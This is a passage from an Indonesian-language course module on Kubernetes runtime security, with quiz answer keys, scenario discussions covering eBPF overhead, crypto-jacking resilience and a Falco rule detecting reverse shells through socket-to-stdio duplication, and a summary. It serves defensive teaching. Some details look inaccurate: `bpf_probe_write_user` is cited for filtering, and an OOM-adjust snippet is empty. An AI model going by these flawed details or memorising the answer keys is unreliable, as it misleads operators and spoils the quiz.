Sebuah insiden crypto-jacking terjadi pada sebuah worker node. Penyerang mengonsumsi 100% CPU node melalui 64 container thread. Akibatnya, Falco DaemonSet kehabisan resource (*CPU throttling*), gagal mengirimkan alert ke SIEM, dan akhirnya terbunuh oleh Linux OOM Killer.
- **Pertanyaan**: Konfigurasi Kubernetes dan Linux Cgroups tingkat lanjut apa yang wajib dipasang pada manifest DaemonSet runtime security untuk menjamin agen tidak pernah tercekik (*starved*) atau di-kill oleh OS saat terjadi insiden penipisan resource?

---

### Kunci Jawaban & Pembahasan Quiz

#### Kunci Jawaban Basic
1. **Keunggulan eBPF vs LKM**: eBPF diverifikasi oleh *BPF Verifier* internal kernel sebelum dijalankan, menjamin tidak ada instruksi ilegal atau loop tak terbatas yang dapat menyebabkan *Kernel Panic* (crash OS host), sedangkan bug pada LKM dapat meruntuhkan seluruh worker node.
2. **Keterbatasan Manifest Checking**: Flag manifest hanya valid saat admission time. Kerentanan pada level aplikasi (seperti RCE, memory corruption, insecure mounts runtime) dapat dieksploitasi oleh penyerang untuk eskalasi hak akses saat container sudah berjalan.
3. **Syscall Utama**: Syscall keluarga `execve` (termasuk `execveat`).
4. **Fungsi BPF Ring Buffer**: Menyediakan antrean sirkular di memori kernel berkecepatan tinggi berbasis *memory-mapped* (mmap) tanpa lock-contention, digunakan untuk mengalirkan data event dari kernel eBPF program ke agent userspace tanpa membuang siklus CPU.
5. **Seccomp dan File Path**: **Tidak bisa**. Seccomp beroperasi murni pada level filter system call (nomor syscall dan argumen numerik sederhana seperti flag). Seccomp tidak dapat mendereferensi atau mem-parse string pointer path file (`char *pathname`) karena keterbatasan evaluasi pointer di kernel space seccomp BPF filter. Filter path file adalah domain kerja dari LSM (AppArmor, SELinux, Landlock, BPF-LSM).

#### Kunci Jawaban Intermediate
6. **Falco vs Tetragon**: Falco (secara *out-of-the-box*) bersifat *asynchronous detection*: event dikirim ke userspace untuk dievaluasi terhadap aturan YAML sebelum alert/mitigasi dipicu (ada jeda beberapa milidetik). Tetragon mampu melakukan *synchronous in-kernel enforcement*: evaluasi aturan dilakukan langsung di dalam virtual machine eBPF/LSM kernel, dan dapat langsung mengirimkan `SIGKILL` atau mengembalikan error `EPERM` kepada proses penyerang sebelum syscall selesai.
7. **Distroless & Runtime Monitoring**: Pod distroless tetap rentan terhadap eksekusi payload berbasis memori (e.g., fileless malware via `memfd_create`), injection via `/proc/self/mem`, atau pemanggilan syscall jaringan langsung oleh proses aplikasi yang dikompromikan.
8. **Pemetaan Host PID ke Metadata K8s**: eBPF program membaca atribut cgroup path/ID dari struct `task_struct` proses pemanggil. Agent userspace secara simultan membaca containerd socket (`/run/containerd/containerd.sock`) dan API Kubelet untuk membuat tabel asosiasi dinamis antara cgroup ID dengan Pod UID, Pod Name, dan Namespace.
9. **Kprobe vs LSM Hook**: `kprobe` dipasang pada entri fungsi kernel arbitrary, bersifat non-standar antar versi kernel, dan rentan terhadap *Time-Of-Check to Time-Of-Use* (TOCTOU) race conditions karena dipanggil sebelum validasi internal kernel. LSM hook dipasang pada titik strategis keamanan kernel yang stabil, terintegrasi dengan konteks keamanan internal objek kernel, dan secara native didesain untuk memblokir aksi (*authoritative security decisions*).
10. **Bahaya `hostPID: true`**: Pod dapat melihat seluruh proses yang berjalan di host worker node, mampu mengirimkan signal (`kill`) ke proses di luar containernya, dan dapat melakukan tracing (`ptrace`) terhadap proses sensitif host (seperti Kubelet), meruntuhkan batas isolasi antar pod.

#### Kunci Jawaban & Pembahasan Skenario Kasus Produksi

##### Pembahasan Kasus 1:
- **Akar Masalah**: Workload Redis yang memproses ratusan ribu operasi per detik memicu syscall `read`/`write`/`epoll` dalam volume jutaan per detik. Jika program eBPF dipasang pada global tracepoint `raw_syscalls:sys_enter` tanpa *early in-kernel filtering*, setiap syscall tunggal di seluruh node akan memicu interupsi context kernel, verifikasi BPF map, dan pengalokasian softirq, yang membebani subsistem `ksoftirqd`.
- **Langkah Mitigasi**:
  1. Filter di tingkat instruksi awal BPF program: Abaikan proses berdasarkan *cgroup id* atau *namespace id* langsung di instruksi BPF pertama sebelum mem-parse metadata lebih lanjut.
  2. Hindari instrumentasi global pada syscall I/O volume tinggi (`read`, `write`, `epoll_wait`, `recvfrom`). Alihkan fokus deteksi hanya pada syscall kontrol/eksekusi (`execve`, `clone`, `socket`, `connect`, `mount`).
  3. Konfigurasikan driver Modern BPF Falco untuk menggunakan selective syscall filtering via `bpf_probe_write_user` atau BPF map filter arrays.

##### Pembahasan Kasus 2:
- **Analisis Kegagalan**: Rule berbasis `proc.name` hanya mencocokkan string statis `comm` dari `task_struct`, yang sangat mudah dimanipulasi atau dihindari dengan menamai ulang binary atau menggunakan interpreter lain.
- **Solusi Deteksi Evasif (Behavioral/Signature-Agnostic)**:
  Fokus pada perilaku esensial dari reverse shell: *Sebuah proses yang bukan merupakan proses inisial container membuka koneksi outbound socket ke internet dan kemudian menduplikasi file descriptor socket tersebut (`dup2`/`dup3`) ke stdin (0), stdout (1), dan stderr (2).*
  
  *Aturan Falco Berbasis Perilaku*:
  ```yaml
  - rule: Behavioral Reverse Shell Detection
    desc: Detect socket file descriptor redirection to standard streams
    condition: >
      evt.type in (dup, dup2, dup3) and 
      evt.dir = < and 
      fd.type in ("ipv4", "ipv6") and 
      evt.arg.newfd in (0, 1, 2) and
      container
    output: >
      EMERGENCY: File descriptor of network socket cloned to stdio. Reverse shell active!
      (pod=%k8s.pod.name proc=%proc.name cmdline=%proc.cmdline fd=%fd.name)
    priority: EMERGENCY
  ```

##### Pembahasan Kasus 3:
- **Langkah Remediasi Konfigurasi DaemonSet Produksi**:
  1. **Guaranteed QoS Class**: Set `requests` bernilai persis sama dengan `limits` untuk CPU dan Memory pada container DaemonSet runtime security.
  2. **System Node Critical Priority**: Pasang priority class tertinggi agar Kubelet tidak pernah meng-evict DaemonSet ini:
     ```yaml
     priorityClassName: system-node-critical
     ```
  3. **Linux Out-Of-Memory Score Adjustment**: Konfigurasikan container security context agar OOM killer host selalu memilih proses penyerang dibanding agen security:
     ```yaml
     securityContext:
       # OOMScoreAdjust -1000 mencegah OS membunuh proses ini sama sekali
       # Membutuhkan hak akses elevated atau konfigurasi via kubelet flag
     ```
  4. **Dedicated System Cgroups**: Pada konfigurasi kubelet di worker node, pastikan Kubelet menggunakan flag `--system-reserved` dan `--kube-reserved` dengan cgroup driver terisolasi (`system.slice`), sehingga kehabisan CPU pada `kubepods.slice` (tempat pod penyerang berada) tidak dapat mengurangi kuota CPU alokasi daemon sistem.

---

### 16. Summary
- **Runtime Security adalah Garis Pertahanan Terakhir**: Ketika mekanisme pertahanan perimeter, image scanning, dan admission control berhasil ditembus, hanya visibilitas berbasis kernel yang dapat mendeteksi dan menghentikan eksploitasi aktif.
- **eBPF Merevolusi Observabilitas Keamanan**: eBPF menggantikan driver LKM yang berisiko dan ptrace yang lambat, menyediakan akses performa tinggi dan aman ke data kernel space secara langsung tanpa resiko crash sistem.
- **LSM Enforcement Menyediakan Real-time Mitigation**: Teknologi seperti Cilium Tetragon mentransformasikan keamanan runtime dari sekadar *alerting pasif* (deteksi detektif) menjadi *penegakan in-kernel aktif* (pencegahan preventif) via `SIGKILL` tersinkronisasi.
- **Siklus Hidup Insiden Tertutup (Closed Loop)**: Keamanan enterprise membutuhkan konvergensi antara deteksi kernel latensi rendah dengan orkestrasi remediasi otomatis (*Automated Remediation*) via NetworkPolicy darurat atau pod isolation untuk meminimalkan dampak serangan zero-day secara definitif.